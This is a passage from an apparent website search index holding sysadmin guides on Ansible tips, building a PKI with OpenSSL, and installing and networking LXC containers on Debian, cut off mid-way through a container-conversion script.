python-pip):\npip install ansible Usage linkMultiple conditions linkIf you want to set multiple condition, it can sometimes be complicated. Here is an example with ‘or’ and ‘and’:\n- name: remove systemd apt: name=systemd state=absent update_cache=yes force=yes when: ansible_virtualization_type not in [ 'lxc', 'kvm', 'virtualbox' ] and (ansible_virtualization_role != 'host') tags: [common, common_packages, common_services] Here we’re do not want to remove systemd package if we’re not in a host (ansible_virtualization_role) and if the ansible_virtualization_type variable is not lxc, kvm or virtualbox.\nDebugging vars linkYou can take a look at a current variable status:\n- debug: var=kibana_current And see the result:\nTASK: [kibana | debug var=kibana_current] ************************************* ESTABLISH CONNECTION FOR USER: root ok: [kibana.deimos.lan] =\u003e { \"item\": \"\", \"kibana_current\": { \"changed\": true, \"cmd\": \"cd /usr/share/nginx/www/kibana ; /usr/bin/git describe --tags \", \"delta\": \"0:00:00.004179\", \"end\": \"2014-06-10 12:10:51.797805\", \"invocation\": { \"module_args\": \"cd /usr/share/nginx/www/kibana ; /usr/bin/git describe --tags\", \"module_name\": \"shell\" }, \"item\": \"\", \"rc\": 0, \"start\": \"2014-06-10 12:10:51.793626\", \"stderr\": \"\", \"stdout\": \"v3.1.0\", \"stdout_lines\": [ \"v3.1.0\" ] } } You can now select a specific item, for example:\n- debug: var=kibana_current.stdout Do not notify on changes linkTo ignore changed=1 for a specific action that will run each time, you can add the change_when statement:\n- shell: git --git-dir={{kibana_path}}/.git/ describe --tags register: kibana_current changed_when: false Force handler to apply linkAnsible handlers are defined in a handlers section or file and are called at the end of each play if they have been triggered. This is useful as it means you can have multiple tasks trigger another action, but ensure that the triggered action only runs once:2\n- name: Add symlink for systemd file: src=/lib/systemd/system/mongodb.service dest=/etc/systemd/system/multi-user.target.wants/mongodb.service state=link notify: reload systemd - meta: flush_handlers ... This will here force ‘reload systemd’ handler to be applied without waiting the end of the playbook.\nCheck syntax and list tasks linkHere is an example to check all your playbook syntax and list tasks at the same time:\n\u003e ansible-playbook -i hosts --syntax-check --list-tasks -e set_env=prod -D --limit server01 site.yml playbook: site.yml play #1 (physical): Ensure iptables is installed (debian) Ensure iptables is installed (redhat) Prepare iptables rules Autoload the rules installing docker registry dependencies adding jenkins user to docker group configure docker ensure docker started play #2 (common): Set hostname to the current machine Use Debian CDN in sources.list user root creating user deploy authorized_keys for root deploy authorized_keys for users generate locales References link http://docs.ansible.com/ ↩︎\nhttp://wherenow.org/ansible-handlers/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  159 ,
                href: "\/Create_a_PKI\/",
                title: "Create a PKI",
                description: "Guide on setting up a Public Key Infrastructure (PKI) for creating, managing, and distributing digital certificates using OpenSSL.",
                content: " Software version 1.0.1k Operating System 8 Website Debian Website Last Update 26/02/2015 Introduction linkA public key infrastructure (PKI)1 is a set of hardware, software, people, policies, and procedures needed to create, manage, distribute, use, store, and revoke digital certificates.\nIn cryptography, a PKI is an arrangement that binds public keys with respective user identities by means of a certificate authority (CA). The user identity must be unique within each CA domain. The third-party validation authority (VA) can provide this information on behalf of the CA. The binding is established through the registration and issuance process. Depending on the assurance level of the binding, this may be carried out by software at a CA or under human supervision. The PKI role that assures this binding is called the registration authority (RA). The RA ensures that the public key is bound to the individual to which it is assigned in a way that ensures non-repudiation.23\ninfo To know the best recommendation for key encryption, please look at mozilla wiki. Installation linkThe first thing to do is to ensure you’ve got openssl installed:\napt-get install openssl Generate CA linkFirst, let’s create the structure:\nmkdir pki cd pki mkdir -p {config,certs,db/ca.db.certs} echo '01'\u003e db/ca.db.serial touch db/ca.db.index Create a configuration file:\n[ ca ] default_ca = domain.fqdn [ domain.fqdn ] dir = ./db certs = ./db new_certs_dir = ./db/ca.db.certs database = ./db/ca.db.index serial = ./db/ca.db.serial RANDFILE = ./db/ca.db.rand certificate = ./certs/ca.crt private_key = ./certs/ca.key default_days = 3650 default_crl_days = 30 default_md = sha256 preserve = no policy = policy_anything [ policy_anything ] countryName = optional stateOrProvinceName = optional localityName = optional organizationName = optional organizationalUnitName = optional commonName = supplied emailAddress = optional You absolutely need to update the domain.fqdn and to can update some values like the validity of the certificate (default_days).\nWe’re now ready to generate the key certificate:\n\u003e openssl genrsa -des3 -out certs/ca.key 2048 Generating RSA private key, 2048 bit long modulus .....................+++ ...................................................+++ e is 65537 (0x10001) Enter pass phrase for certs/ca.key: Verifying - Enter pass phrase for certs/ca.key: Enter a pass phrase. This will be used to generate client certificates.\nSelf sign it and enter the required informations like in this example:\n\u003e openssl req -utf8 -new -x509 -days 3650 -key certs/ca.key -out certs/ca.crt Enter pass phrase for certs/ca.key: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. ----- Country Name (2 letter code) [AU]:FR State or Province Name (full name) [Some-State]:France Locality Name (eg, city) []:Paris Organization Name (eg, company) [Internet Widgits Pty Ltd]:company Organizational Unit Name (eg, section) []:section Common Name (e.g. server FQDN or YOUR name) []:domain.fqdn Email Address []:email@domain.fqdn DER certificate linkYou can also generate a DER certificate to import into web browser:\nopenssl x509 -in certs/ca.crt -outform DER -out certs/ca.der Generate a certificate linkWe’re now ready to create certificates. We can create multiple ones (one by one for each domain) or we can create a wildcard. That’s what we’re going to do. Generate the key:\n\u003e openssl genrsa -out certs/wildcard.mydomain.fqdn.key 2048 Generating RSA private key, 2048 bit long modulus ..........+++ ............................................+++ e is 65537 (0x10001) Then generate the csr. As described above, we want to create a wildcard certificate, so do no forget to add the ‘*’ character:\n\u003e openssl req -days 3650 -new -key certs/wildcard.mydomain.fqdn.key -out certs/wildcard.mydomain.fqdn.csr You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.', the field will be left blank. ----- Country Name (2 letter code) [AU]:FR State or Province Name (full name) [Some-State]:France Locality Name (eg, city) []:Paris Organization Name (eg, company) [Internet Widgits Pty Ltd]:company Organizational Unit Name (eg, section) []:section Common Name (e.g. server FQDN or YOUR name) []:*.domain.fqdn Email Address []:user@domain.fqdn Please enter the following 'extra' attributes to be sent with your certificate request A challenge password []: An optional company name []: Do not enter a challenge password or it will be required each time you’ll want to use it.\nYou can now generate the final self signed certificate:\n\u003e openssl ca -config config/ca.config -out certs/wildcard.mydomain.fqdn.crt -infiles certs/wildcard.mydomain.fqdn.csr Using configuration from config/ca.config Enter pass phrase for ./certs/ca.key: Check that the request matches the signature Signature ok The Subject's Distinguished Name is as follows countryName :PRINTABLE:'FR' stateOrProvinceName :ASN.1 12:'France' localityName :ASN.1 12:'Paris' organizationName :ASN.1 12:'company' organizationalUnitName:ASN.1 12:'section' commonName :ASN.1 12:'*.domain.fqdn' emailAddress :IA5STRING:'user@domain.fqdn' Certificate is to be certified until Feb 14 22:02:29 2025 GMT (3650 days) Sign the certificate? [y/n]:y 1 out of 1 certificate requests certified, commit? [y/n]y Write out database with 1 new entries Data Base Updated Check certificates linkYou can now check SSL certificate like that:\nopenssl x509 -text -in certs/wildcard.mydomain.fqdn.crt References link http://en.wikipedia.org/wiki/Public_key_infrastructure ↩︎\nhttp://artisan.karma-lab.net/creer-sa-propre-mini-pki ↩︎\nhttps://developer.mozilla.org/en-US/docs/Mozilla/Security/x509_Certificates ↩︎\n"
            }
        );
    index.add(
            {
                id:  160 ,
                href: "\/LXC_:_Install_and_configure_the_Linux_Containers\/",
                title: "LXC: Install and configure the Linux Containers",
                description: "A comprehensive guide on installing, configuring and using Linux Containers (LXC) on Debian systems.",
                content: " Software version 0.8 Operating System Debian 7 Website LXC Website Last Update 22/02/2015 Introduction linkLXC is the userspace control package for Linux Containers, a lightweight virtual system mechanism sometimes described as “chroot on steroids”.\nLXC builds up from chroot to implement complete virtual systems, adding resource management and isolation mechanisms to Linux’s existing process management infrastructure.\nLinux Containers (lxc) implement:\nResource management via “process control groups” (implemented via the cgroup filesystem) Resource isolation via new flags to the clone(2) system call (capable of create several types of new namespaces for things like PIDs and network routing) Several additional isolation mechanisms (such as the “-o newinstance” flag to the devpts filesystem). The LXC package combines these Linux kernel mechanisms to provide a userspace container object, a lightweight virtual system with full resource isolation and resource control for an application or a system.\nLinux Containers take a completely different approach than system virtualization technologies such as KVM and Xen, which started by booting separate virtual systems on emulated hardware and then attempted to lower their overhead via paravirtualization and related mechanisms. Instead of retrofitting efficiency onto full isolation, LXC started out with an efficient mechanism (existing Linux process management) and added isolation, resulting in a system virtualization mechanism as scalable and portable as chroot, capable of simultaneously supporting thousands of emulated systems on a single server while also providing lightweight virtualization options to routers and smart phones.\nThe first objective of this project is to make the life easier for the kernel developers involved in the containers project and especially to continue working on the Checkpoint/Restart new features. The lxc is small enough to easily manage a container with simple command lines and complete enough to be used for other purposes.1\nInstallation linkTo install LXC, we do not need too much packages. As I will want to manage my LXC containers with libvirt, I need to install it as well:\naptitude install lxc bridge-utils debootstrap git git-core At the time where I write this sentence, there is an issue with LVM container creation (here is a first Debian bug and a second one) on Debian Wheezy and it doesn’t seams to be resolve soon.\nHere is a workaround to avoid errors during LVM containers initialization:\ncd /tmp git clone https://github.com/simonvanderveldt/lxc-debian-wheezy-template.git cp lxc-debian-wheezy-template/lxc-debian-0.9.0-upstream /usr/share/lxc/templates/lxc-debian-squeeze cp lxc-debian-wheezy-template/lxc-debian-0.9.0-upstream /usr/share/lxc/templates/lxc-debian-wheezy sed -i 's/-squeeze/-wheezy/' /usr/share/lxc/templates/lxc-debian-wheezy chmod 755 /usr/share/lxc/templates/lxc-debian-* On Jessie, you’ll also have to install this:\naptitude install cgroupfs-mount Kernel linkIt’s recommended to get a recent kernel as LXC grow very fast, get better performances, stabilities and new features. To get a newer kernel, we’re going to use a kernel from the testing repo:\n# /etc/apt/preferences.d/kernel Package: * Pin: release a=stable Pin-priority: 900 Package: * Pin: release a=testing Pin-priority: 100 Package: linux-image-* Pin: release a=testing Pin-priority: 1001 Package: linux-headers-* Pin: release a=testing Pin-priority: 1001 Package: linux-kbuild-* Pin: release a=testing Pin-priority: 1001 Add then this testing content:\n# /etc/apt/sources.list.d/testing.list # Testing deb http://ftp.fr.debian.org/debian/ testing main non-free contrib deb-src http://ftp.fr.debian.org/debian/ testing main non-free contrib Then you can install the latest kernel image:\naptitude update aptitude install linux-image-amd64 If it’s not enough, you’ll need to install the package with specific kernel version number corresponding to latest (ex. linux-image-3.11-2-amd64) and reboot on this new kernel.\nConfiguration linkCgroups linkLXC is based on cgroups. Those are used to limit CPU, RAM etc…You can check here for more informations.\nWe need to enable Cgroups. Add this line in fstab:\n# /etc/fstab [...] cgroup /sys/fs/cgroup cgroup defaults 0 0 As we want to manage memory and swap on containers, as it’s not available by default, add cgroup argument to grub to activate those functionality:\ncgroup RAM feature: “cgroup_enable=memory” cgroup SWAP feature: “swapaccount=1” # /etc/default/grub # If you change this file, run 'update-grub' afterwards to update # /boot/grub/grub.cfg. # For full documentation of the options in this file, see: # info -f grub -n 'Simple configuration' GRUB_DEFAULT=0 GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=`lsb_release -i -s 2\u003e /dev/null || echo Debian` GRUB_CMDLINE_LINUX_DEFAULT=\"quiet cgroup_enable=memory swapaccount=1\" GRUB_CMDLINE_LINUX=\"\" [...] Then regenerate grub config:\nupdate-grub info You’ll need to reboot to make the cgroup memory feature active Then mount it:\nmount /sys/fs/cgroup Check LXC configuration link \u003e lxc-checkconfig Kernel config /proc/config.gz not found, looking in other places... Found kernel config file /boot/config-3.2.0-4-amd64 --- Namespaces --- Namespaces: enabled Utsname namespace: enabled Ipc namespace: enabled Pid namespace: enabled User namespace: enabled Network namespace: enabled Multiple /dev/pts instances: enabled --- Control groups --- Cgroup: enabled Cgroup clone_children flag: enabled Cgroup device: enabled Cgroup sched: enabled Cgroup cpu account: enabled Cgroup memory controller: enabled Cgroup cpuset: enabled --- Misc --- Veth pair device: enabled Macvlan: enabled Vlan: enabled File capabilities: enabled Note : Before booting a new kernel, you can check its configuration usage : CONFIG=/path/to/config /usr/bin/lxc-checkconfig report All should be enabled to ensure it will work as expected! Network linkNo specific configuration (same than host) linkIf you don’t configure your network configuration after container initialization, you’ll have the exact same configuration on your guests (containers) than your host. That mean all network interfaces are available on the guests and they will have full access to the host.\nreport This is not the recommended solution for production usages The pro of that “no” configuration, is to have network working out of the box for the guests (perfect for quick tests) Another con, is to have the access to process on host. I mean that a SSH server running on host will have it’s port available on the guest too. So you cannot have a SSH server running on guests without changing port (or you’ll have a network binding conflict). You can easily check this configuration in opening a port on the host (here 80):\nnc -lp 80 now on a guest, you can see it listening:\n\u003e netstat -aunt | grep 80 tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN Nat configuration linkHow does it works for NAT configuration?\nYou need to choose which kind of configuration you want to use: libvirt or dnsmaq Iptables: to help to access nated containers from outside and help containers to get internet Configure the network container With Libvirt linkYou’ll need to install libvirt first:\naptitude install libvirt-bin Nat is the default configuration. But you may need to do some adjustements. Add the forwarding to sysctl:\n# /etc/sysctl.conf net.ipv4.ip_forward = 1 Check that the connecting is active:\n\u003e virsh net-list --all Name State Autostart ----------------------------------------- default inactive no If it’s not the case, then set the default network configuration:\nvirsh net-define /etc/libvirt/qemu/networks/default.xml virsh net-autostart default virsh net-start default Then you should see it enable:\n\u003e virsh net-list --all Name State Autostart ----------------------------------------- default active yes Edit the configuration to add your range of IP:\ndefault Now it’s done, restart libvirt.\nWith dnsmasq linkLibvirt is not necessary as for the moment it doesn’t manage LXC containers very well. So you can manage your own dnsmasq server to give DNS and DHCP to your containers. First of all, install it:\naptitude install dnsmasq dnsmasq-utils Then configure it:\n# /etc/dnsmasq.conf # Bind it to the LXC interface interface=lxcbr0 bind-interfaces # Want DHCP client FQDN dhcp-fqdn # Domain name and ip range with lease time domain=deimos.fr,192.168.122.0/24 dhcp-range=192.168.122.100,192.168.122.200,1h # DHCP options dhcp-option=40,deimos.fr log-dhcp Then restart the dnsmasq service. And now configure the lxcbr0 interface:\n# /etc/network/interfaces # This bridge will is used to NAT LXC containers' traffic auto lxcbr0 iface lxcbr0 inet static pre-up brctl addbr lxcbr0 bridge_fd 0 bridge_maxwait 0 address 192.168.122.1 netmask 255.255.255.0 post-up iptables -A FORWARD -i lxcbr0 -s 192.168.122.1/24 -j ACCEPT post-up iptables -A POSTROUTING -t nat -s 192.168.122.1/24 -j MASQUERADE # add checksum so that dhclient does not complain. # udp packets staying on the same host never have a checksum filled else post-up iptables -A POSTROUTING -t mangle -p udp --dport bootpc -s 192.168.122.1/24 -j CHECKSUM --checksum-fill Iptables linkYou may need to configure iptables for example if you’re on a dedicated box where the provider doesn’t allow bridge configuration. Here is a working iptables configuration to permit incoming connexions to Nated guests:\n#!/bin/bash # Made by Pierre Mavro / Deimosfr # This script will Nat you KVM/containers hosts # and help you to get access from outside #------------------------------------------------------------------------- # Essentials #------------------------------------------------------------------------- IPTABLES='/sbin/iptables' modprobe nf_conntrack_ftp #------------------------------------------------------------------------- # Physical and virtual interfaces definitions #------------------------------------------------------------------------- # Interfaces wan1_if=\"eth0\" wan2_if=\"eth0:0\" kvm_if=\"virbr0\" #------------------------------------------------------------------------- # Networks definitions #------------------------------------------------------------------------- # Networks wan1_ip=\"x.x.x.x\" wan2_ip=\"x.x.x.x\" vms_net=\"192.168.122.0/24\" # Dedibox internals IPs web_ip=\"192.168.122.10\" mail_ip=\"192.168.122.20\" #------------------------------------------------------------------------- # Global Rules input / output / forward #------------------------------------------------------------------------- # Flushing tables $IPTABLES -F $IPTABLES -X $IPTABLES -t nat -F # Define default policy $IPTABLES -P INPUT DROP $IPTABLES -P OUTPUT ACCEPT $IPTABLES -P FORWARD ACCEPT ## Loopback accepte ${IPTABLES} -A FORWARD -i lo -o lo -j ACCEPT ${IPTABLES} -A INPUT -i lo -j ACCEPT ${IPTABLES} -A OUTPUT -o lo -j ACCEPT # Allow KVM DHCP/dnsmasq ${IPTABLES} -A INPUT -i $kvm_if -p udp --dport 67 -j ACCEPT ${IPTABLES} -A INPUT -i $kvm_if -p udp --dport 69 -j ACCEPT $IPTABLES -A INPUT -j ACCEPT -d $vms_net $IPTABLES -A INPUT -j ACCEPT -m state --state ESTABLISHED,RELATED #------------------------------------------------------------------------- # Allow masquerading for KVM VMs #------------------------------------------------------------------------- # Activating masquerade to get Internet from KVM VMs $IPTABLES -t nat -A POSTROUTING -o $wan1_if -s $vms_net -j MASQUERADE #------------------------------------------------------------------------- # Allow ports on KVM host #------------------------------------------------------------------------- # Allow ICMP $IPTABLES -A INPUT -j ACCEPT -p icmp # SSH access $IPTABLES -A INPUT -j ACCEPT -p tcp --dport 22 # HTTPS access $IPTABLES -A INPUT -j ACCEPT -p tcp --dport 443 #------------------------------------------------------------------------- # Redirections for incoming connections (wan1) #------------------------------------------------------------------------- # HTTP access $IPTABLES -t nat -A PREROUTING -p tcp --dport 80 -d $wan1_ip -j DNAT --to-destination $web_ip:80 # HTTP access $IPTABLES -t nat -A PREROUTING -p tcp --dport 443 -d $wan1_ip -j DNAT --to-destination $web_ip:443 # Mail for mailsrv $IPTABLES -t nat -A PREROUTING -p tcp --dport 25 -d $wan1_ip -j DNAT --to-destination $mail_ip:25 #------------------------------------------------------------------------- # Reload fail2ban #------------------------------------------------------------------------- /etc/init.d/fail2ban reload Nat on containers linkDHCP linkOn each containers you want to use NAT configuration, you need to add those lines for DHCP configuration2:\n# /var/lib/lxc/mycontainer/config ## Network lxc.network.type = veth lxc.network.flags = up # Network host side lxc.network.link = virbr0 lxc.network.veth.pair = veth0 # lxc.network.hwaddr = 00:FF:AA:00:00:01 # Network container side lxc.network.name = eth0 lxc.network.ipv4 = 0.0.0.0/24 Then in the LXC container (mount the LV if you did LVM) configure the network like this:\n# /var/lib/lxc/mycontainer/rootfs/etc/network/interfaces auto eth0 iface eth0 inet dhcp Static IP link info This is only applicable for Libvirt You can also configure manual static IP if you want by changing ’lxc.network.ipv4’. Another elegant method is to ask DHCP to fix it:\ndefault warning Do not forget to fix lxc.network.hwaddr parameter. Here is a way to generate mac address:\nopenssl rand -hex 6 | sed 's/\\\\(..\\\\\\)/\\\\1:/g; s/.$//' Private container interface linkYou can create a private interface for your containers. Containers will be able to communicate together though this dedicated interface. Here are the steps to create one between 2 hosts.\nOn the host server, install UML utilities:\naptitude install uml-utilities Then edit the network configuration file and add a bridge:\n# /etc/network/interfaces auto privbr0 iface privbr0 inet static pre-up /usr/sbin/tunctl -t tap0 pre-up /sbin/ifup tap0 post-down /sbin/ifdown tap0 bridge_ports tap0 bridge_fd 0 You can restart your network or launch it manually if you can’t restart now:\ntunctl -t tap0 brctl addbr privbr0 brctl addif privbr0 tap0 Then edit both containers that will have this dedicated interface and replace or add those lines:\n# /var/lib/lxc/mycontainer/config # Private interface lxc.network.type = veth lxc.network.flags = up lxc.network.link = privbr0 lxc.network.ipv4 = 10.0.0.1 Now start the container and you’ll have the 10.0.0.X dedicated network.\nBridged configuration linkNow modify your /etc/network/interfaces file to add bridged configuration:\n# /etc/network/interfaces auto lo br0 iface lo inet loopback # The primary network interface iface br0 inet static address 192.168.0.80 netmask 255.255.255.0 gateway 192.168.0.252 broadcast 192.168.0.255 network 192.168.0.0 bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off br0 is replacing eth0 for bridging.\nHere is another configuration with 2 network cards and 2 bridges:\n# /etc/network/interfaces # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo br0 br1 iface lo inet loopback # DMZ iface br0 inet static address 192.168.10.1 netmask 255.255.255.0 gateway 192.168.10.254 network 192.168.10.0 broadcast 192.168.10.255 bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off # Internal iface br1 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.254 network 192.168.0.0 broadcast 192.168.0.255 bridge_ports eth1 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off VLAN Bridged configuration linkAnd a last one with Vlans bridged (look at this documentation to enable it before):\nWe will need to use etables (iptables for bridged interfaces). Install this:\naptitude install ebtables Check you etables configuration:\n# /etc/default/ebtables EBTABLES_LOAD_ON_START=\"yes\" EBTABLES_SAVE_ON_STOP=\"yes\" EBTABLES_SAVE_ON_RESTART=\"yes\" And enable VLAN tagging on bridged interfaces:\nebtables -t broute -A BROUTING -i eth0 -p 802_1Q -j DROP # /etc/network/interfaces # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback # The primary network interface allow-hotplug eth0 auto eth0 iface eth0 inet manual auto eth0.110 iface eth0.110 inet manual vlan_raw_device eth0 # The bridged interface auto vmbr0 iface vmbr0 inet static address 192.168.100.1 netmask 255.255.255.0 network 192.168.100.0 broadcast 192.168.100.255 gateway 192.168.100.254 # dns-* options are implemented by the resolvconf package, if installed dns-nameservers 192.168.100.254 dns-search deimos.fr bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off auto vmbr0.110 iface vmbr0.110 inet static address 192.168.110.1 netmask 255.255.255.0 bridge_ports eth0.190 bridge_stp off bridge_maxwait 0 bridge_fd 0 Security linkIt’s recommended to use Grsecurity kernel (may be not compatible with the testing kernel)or Apparmor.\nWith Grsecurity, here are the parameters3:\n# /etc/sysctl.d/grsecurity.conf kernel.grsecurity.chroot_deny_mount = 0 kernel.grsecurity.chroot_deny_chroot = 0 kernel.grsecurity.chroot_deny_chmod = 0 kernel.grsecurity.chroot_deny_mknod = 0 kernel.grsecurity.chroot_caps = 0 kernel.grsecurity.chroot_findtask = 0 Basic Usage linkCreate a container linkClassic method linkTo create a container with a wizard:\nlxc-create -n mycontainer -t debian or\nlxc-create -n mycontainer -t debian-wheezy or\nlxc-create -n mycontainer -t debian-wheezy -f /etc/lxc/lxc-nat.conf n: the name of the container t: the template of the container. You can find the list in this folder: /usr/share/lxc/templates f: the configuration template It will deploy through debootstrap a new container.\nIf you want to plug yourself to a container through the console, your first need to create devices:\nchroot /var/lib/lxc/mycontainer/rootfs mknod -m 666 /dev/tty1 c 4 1 mknod -m 666 /dev/tty2 c 4 2 mknod -m 666 /dev/tty3 c 4 3 mknod -m 666 /dev/tty4 c 4 4 mknod -m 666 /dev/tty5 c 4 5 mknod -m 666 /dev/tty6 c 4 6 Then you’ll be able to connect:\nlxc-console -n mycontainer LVM method linkIf you’re using LVM to store your containers (strongly recommended), you can ask to LXC to auto create the logical volume and mkfs it for you:\nlxcname=mycontainerlvm lxc-create -t debian-wheezy -n $lxcname -B lvm --vgname lxc --lvname $lxcname --fssize 4G --fstype ext3 t: specify the wished template B: we want to use LVM as backend (BTRFS is also supported) vgname: set the volume group (VG) name where logical volume (LV) should be created lvname: set the wished LV name for that container fssize: set the size of the LV fstype: set the filesystem for this container (full list is available in /proc/filesystems) BTRFS method linkIf your host has a btrfs /var, the LXC administration tools will detect this and automatically exploit it by cloning containers using btrfs snapshots.4\nTemplating configuration linkYou can template configuration if you want to simplify your deployments. It could be useful if you need to do specific lxc configuration. To do it, simply create a file (name it as you want) and add your lxc configuration (here the network configuration):\n# /etc/lxc/lxc-nat.conf ## Network lxc.network.type = veth lxc.network.flags = up # Network host side lxc.network.link = virbr0 lxc.network.veth.pair = veth-$name # Network container side lxc.network.name = eth0 lxc.network.ipv4 = 0.0.0.0/24 Then you could call it when you’ll create a container with -f argument. You can create as many configuration as you want and place them were you want. I did it in /etc/lxc as I felt it well.\nList containers linkYou can list containers:\n\u003e lxc-list RUNNING mycontainer FROZEN STOPPED mycontainer2 If you want to list running containers:\nlxc-ls --active Start a container linkTo start a container as a deamon:\nlxc-start -n mycontainer -d d: Run the container as a daemon. As the container has no more tty, if an error occurs nothing will be displayed, the log file can be used to check the error. Plug to console linkYou can connect to the console:\nlxc-console -n mycontainer If you’ve problems to connect to the container, do this.\nStop a container linkTo stop a container:\nlxc-shutdown -n mycontainer or\nlxc-halt -n mycontainer info You can’t lxc-halt/lxc-shutdown on a container based on LVM in the current Debian version(Wheezy) Force shutdown linkIf you need to force a container to halt:\nlxc-stop -n mycontainer Autostart on boot linkIf you need to get LXC containers to autostart on boot, you’ll need to create symlink:\nln -s /var/lib/lxc/mycontainer/config /etc/lxc/auto/mycontainer Delete a container linkYou can delete a container like this:\nlxc-destroy -n mycontainer report This will remove all your data as well. Do a backup before doing destroy! Monitoring linkIf you want to know the state of a container:\nlxc-info -n mycontainer state: RUNNING pid: 3034 Available state are:\nABORTING RUNNING STARTING STOPPED STOPPING Freeze linkIf you want to freeze (suspend like) a container:\nlxc-freeze -n mycontainer Unfreeze/Restore linkIf you want to unfreeze (resume/restore like) a container:\nlxc-unfreeze -n mycontainer Monitor changes linkYou can monitor changes of a container with lxc-monitor:\n\u003e lxc-monitor -n mycontainer 'mycontainer' changed state to [STOPPING] 'mycontainer' changed state to [STOPPED] 'mycontainer' changed state to [STARTING] 'mycontainer' changed state to [RUNNING] You can see all container changing states.\nTrigger changes linkYou can also use ’lxc-wait command with ‘-s’ parameter to wait a specific state and execute something afterward:\nlxc-wait -n mycontainer -s STOPPED \u0026\u0026 echo \"Container stopped\" | mail -s 'You need to restart it' xxx@mycompany.com Launch command in a running container linkYou can launch a command in a running container without being inside it:\nlxc-attach -n mycontainer -- /etc/init.d/cron restart This restart the cron service in “mycontianer” container.\nConvert/Migrate a VM/Host to a LXC container linkIf you already have a running machine on KVM/VirtualBox or anything else and want to convert to an LXC container, it’s easy. I’ve wrote a script (strongly inspired from the lxc-create) that helps me to initiate the missing elements. You can copy it in /usr/bin folder (lxc-convert).\n#!/bin/bash # # lxc: linux Container library # Authors: # Pierre MAVRO # This library is free software; you can redistribute it and/or # modify it under the terms of the GNU Lesser General Public # License as published by the Free Software Foundation; either # version 2.1 of the License, or (at your option) any later version. # This library is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU # Lesser General Public License for more details. # You should have received a copy of the GNU Lesser General Public # License along with this library; if not, write to the Free Software # Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA configure_debian() { rootfs=$1 hostname=$2 # Remove unneeded folders rm -Rf $rootfs/{dev,proc,sys,run} # Decompress dev devices tar -xzf /usr/share/debootstrap/devices.tar.gz -C $rootfs rootfs_dev=$rootfs/dev # Create missing dev devices mkdir -m 755 $rootfs_dev/pts mkdir -m 1777 $rootfs_dev/shm mknod -m 666 $rootfs_dev/tty0 c 4 0 mknod -m 600 $rootfs_dev/initctl p # Create folders mkdir -p $rootfs/{proc,sys,run} # Do not use fstab mv $rootfs/etc/fstab{,.old} touch $rootfs/etc/fstab # squeeze only has /dev/tty and /dev/tty0 by default, # therefore creating missing device nodes for tty1-4. for tty in $(seq 1 4); do if [ ! -e $rootfs/dev/tty$tty ]; then mknod $rootfs/dev/tty$tty c 4 $tty fi done # configure the inittab cat \u003c $rootfs/etc/inittab id:2:initdefault: si::sysinit:/etc/init.d/rcS l0:0:wait:/etc/init.d/rc 0 l1:1:wait:/etc/init.d/rc 1 l2:2:wait:/etc/init.d/rc 2 l3:3:wait:/etc/init.d/rc 3 l4:4:wait:/etc/init.d/rc 4 l5:5:wait:/etc/init.d/rc 5 l6:6:wait:/etc/init.d/rc 6 # Normally not reached, but fallthrough in case of emergency. z6:6:respawn:/sbin/sulogin 1:2345:respawn:/sbin/getty 38400 console c1:12345:respawn:/sbin/getty 38400 tty1 linux c2:12345:respawn:/sbin/getty 38400 tty2 linux c3:12345:respawn:/sbin/getty 38400 tty3 linux c4:12345:respawn:/sbin/getty 38400 tty4 linux EOF # add daemontools-run entry if [ -e $rootfs/var/lib/dpkg/info/daemontools.list ]; then cat \u003c\u003e $rootfs/etc/inittab #-- daemontools-run begin SV:123456:respawn:/usr/bin/svscanboot #-- daemontools-run end EOF fi # Remove grub and kernel chroot $rootfs apt-get --yes -o Dpkg::Options::=\"--force-confdef\" -o Dpkg::Options::=\"--force-confold\" remove grub grub2 grub-pc grub-common linux-image-amd64 # remove pointless services in a container chroot $rootfs \"LANG=C /usr/sbin/update-rc.d -f checkroot.sh remove\" # S chroot $rootfs \"LANG=C /usr/sbin/update-rc.d checkroot.sh stop 09 S .\" chroot $rootfs \"LANG=C /usr/sbin/update-rc.d -f umountfs remove\" # 0 6 chroot $rootfs \"LANG=C /usr/sbin/update-rc.d umountfs start 09 0 6 .\" chroot $rootfs \"LANG=C /usr/sbin/update-rc.d -f umountroot remove\" # 0 6 chroot $rootfs \"LANG=C /usr/sbin/update-rc.d umountroot start 10 0 6 .\" # The following initscripts don't provide an empty start or stop block. # To prevent them being enabled on upgrades, we leave a start link on # runlevel 3. chroot $rootfs \"LANG=C /usr/sbin/update-rc.d -f hwclock.sh remove\" # S 0 6 chroot $rootfs \"LANG=C /usr/sbin/update-rc.d hwclock.sh start 10 3 .\" chroot $rootfs \"LANG=C /usr/sbin/update-rc.d -f hwclockfirst.sh remove\" # S chroot $rootfs \"LANG=C /usr/sbin/update-rc.d hwclockfirst start 08 3 .\" chroot $rootfs \"LANG=C /usr/sbin/update-rc.d -f module-init-tools remove\" # S chroot $rootfs \"LANG=C /usr/sbin/update-rc.d module-init-tools start 10 3 .\" return 0 } copy_configuration() { path=$1 rootfs=$2 name=$3 cat \u003c $path/config # $path/config ## Container lxc.utsname = $hostname lxc.tty = 4 lxc.pts = 1024 #lxc.console = /var/log/lxc/$name.console ## Capabilities #lxc.cap.drop = mac_admin #lxc.cap.drop = mac_override lxc.cap.drop = sys_admin #lxc.cap.drop = sys_module ## Devices # Allow all devices #lxc.cgroup.devices.allow = a # Deny all devices 